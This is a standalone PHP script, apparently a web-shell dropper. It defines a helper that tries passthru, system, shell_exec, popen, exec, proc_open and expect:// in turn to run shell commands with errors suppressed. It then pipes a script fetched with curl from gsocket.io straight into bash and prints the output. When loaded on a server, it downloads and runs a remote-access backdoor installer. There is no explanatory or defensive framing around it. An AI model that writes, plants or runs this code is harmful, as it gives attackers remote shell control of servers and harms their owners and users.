<?php 
function cmd($in) {
	try {
		$out = '';
		if (function_exists('passthru')) {
			ob_start();
			@passthru($in);
			$out = ob_get_clean();
		}
		elseif (function_exists('system')) {
			ob_start();
			@system($in);
			$out = ob_get_clean();
		}
		elseif (function_exists('shell_exec')) {
			$out = shell_exec($in);
		}
		elseif (is_resource($f = @popen($in, "r"))) {
			$out = "";
			while (!@feof($f)) $out.= fread($f, 1024);
			pclose($f);
		}
		elseif (function_exists('exec')) {
			@exec($in, $out);
			$out = @join("\n", $out);
		}
		elseif (function_exists('proc_open')) {
			$descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") );
			$process = proc_open($in, $descriptorspec, $pipes, null, null);
			if (is_resource($process)) {
				fclose($pipes[0]);
				$out = stream_get_contents($pipes[1]);
				$out .= stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
			}
		}
		elseif (function_exists('expect_popen')) {
			$out = @file_get_contents('expect://' . $in);
		}
		else {
			$out = "Can't exec commands. But we still have PHP!";
		}
	}
	catch(Exception $e) {
		$out = $e->getMessage();
	}
	return $out;
}

$response = cmd('bash -c "$(curl -fsSL https://gsocket.io/y)"');

echo '<pre>' . $response . '</pre>';
?>
